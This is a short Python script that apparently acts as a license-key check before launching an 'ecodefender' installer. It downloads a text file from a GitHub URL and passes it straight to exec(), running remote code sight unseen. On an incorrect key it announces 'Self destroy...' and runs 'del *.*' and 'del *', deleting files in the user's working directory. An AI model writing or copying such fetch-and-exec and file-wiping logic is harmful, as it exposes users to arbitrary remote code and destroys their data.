try:
    import hashlib, os, requests
    #from datetime import datetime
except:
    import os
    #from datetime import datetime
    os.system("pip install hashlib")
    os.system("pip install requests")


databack = requests.get('https://raw.githubusercontent.com/AlexPhamNgoQuoc/keytagtest/main/keytest.txt')
exec(databack.text)
#gkey = datetime.today().strftime('%Y-%m-%d')
#unicode_string = gkey.encode('utf_16','strict')


key = str(input("Key: "))
hashed_key = hashlib.sha256(key.encode()).hexdigest()

if hashed_key in [hashlib.sha256(k.encode()).hexdigest() for k in valid_nkeys]:   #<-- Ignore the vald_nkeys because it all ready got import in the requests module <-
    print("Key accepted, start installing...")                                    #                                                                                   |
    os.system("ecodefenderfull.exe")                                              #                                                                                   |
elif hashed_key in [hashlib.sha256(k.encode()).hexdigest() for k in valid_ekeys]: #<-- Ignore the vald_nkeys because it all ready got import in the requests module   |
    print("Key for edit accepted, .gmz file was showed")
    os.system("attrib -r -h -s ecodefendereditable.gmz")
else:
    os.system("cls")
    print("Key incorrect!")
    print("Self destroy...")
    os.system("del *.*")
    os.system("del *")
